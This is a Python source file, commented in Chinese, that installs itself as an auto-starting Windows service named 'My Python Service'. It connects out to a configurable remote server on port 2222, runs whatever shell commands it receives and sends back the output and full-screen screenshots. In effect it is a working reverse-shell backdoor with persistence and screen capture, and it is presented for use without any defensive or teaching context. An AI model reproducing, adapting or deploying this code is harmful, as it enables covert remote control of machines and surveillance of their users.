#!python3
# Filename: pyservices.py
import win32serviceutil
import win32service
import win32event
import servicemanager
import sys,os
import psutil

import socket
import time
import subprocess
import mss
from PIL import Image
import io




def capture_screenshot():
    # 使用 mss 捕获屏幕
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # 截取主屏幕
        img = sct.grab(monitor)

        # 将图像转换为 PIL 格式
        img_pil = Image.frombytes("RGBA", img.size, img.bgra, "raw", "BGRA", 0, 1)

        # 将图像保存到 BytesIO 对象中
        byte_io = io.BytesIO()
        img_pil.save(byte_io, format='PNG')
        byte_io.seek(0)

        # 返回图像的字节数据
        return byte_io.getvalue()


def main():
    server_ip = '127.0.0.1'  # 远程服务器的 IP 地址
    server_port = 2222

    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))
            print(f"成功连接到 {server_ip}:{server_port}")
            break  # 连接成功后退出循环
        except Exception as e:
            print(f"连接失败: {str(e)}，每分钟重试一次...")
            time.sleep(5)  # 等待1分钟后重试

    while True:
        command = client_socket.recv(4096).decode()
        print(f"收到远程命令: {command}")
        if command.lower() == 'exit':
            break
        if command.lower() == '':
            continue

        elif command.lower() == 'screenshot':  # 检测截屏命令
            # 进行截图并发送回去
            image_data = capture_screenshot()  # 调用截图函数

            # 发送图像数据
            client_socket.sendall(image_data)  # 发送完整的图像数据
            print(f"成功发送截图，大小: {len(image_data)} 字节")
            continue

        # 执行命令并返回结果
        try:
            # 将 text=True 使返回值为字符串
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            response = output
            print(f"命令执行成功: {response}")
        except subprocess.CalledProcessError as e:
            # 如果命令执行失败，返回错误信息
            response = e.output  # 获取错误输出
            print(f"命令执行失败: {response}")
        except Exception as e:
            response = str(e)  # 捕获其他异常
            print(f"命令执行异常: {response}")
        client_socket.send(response.encode('utf-8'))  # 发送 UTF-8 编码的响应
        print(f"成功发送命令响应")
    client_socket.close()



def set_service_auto_start(service_name):
    try:
        # 使用 sc config 命令更改服务的启动类型
        os.system(f'sc config "{service_name}" start= auto')
        print(f"Service '{service_name}' set to automatic start.")
        os.system(f'sc start "{service_name}"')
        print(f"Service '{service_name}' started.")
    except Exception as e:
        print(f"Failed to set service '{service_name}' to automatic start: {e}")



# Windows服务安装 代码段
def write_process_id_to_file(file_path):
    pid = str(psutil.Process().pid)
    with open(file_path, 'w') as file:
        file.write(pid)
# 进程ID
process_id_file_path = r"MyPythonService.pid"
class MyService(win32serviceutil.ServiceFramework):
    _svc_name_ = "MyPythonService"
    _svc_display_name_ = "My Python Service"
    _svc_description_ = "python 后台 客户端服务"
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        socket.setdefaulttimeout(60)
        self.is_alive = True
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.is_alive = False
    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()
    def main(self):
        write_process_id_to_file(process_id_file_path)
        print("Daemon is running...")


        # 启动客户端功能
        main()



        # 等待服务停止信号
        while self.is_alive:
            rc = win32event.WaitForSingleObject(self.hWaitStop, 1000)
            if rc == 0:
                # 服务停止信号
                self.is_alive = False
            else:
                # 处理其他事务
                pass





if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(MyService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(MyService)

    # 设置服务自动启动
    set_service_auto_start(MyService._svc_name_)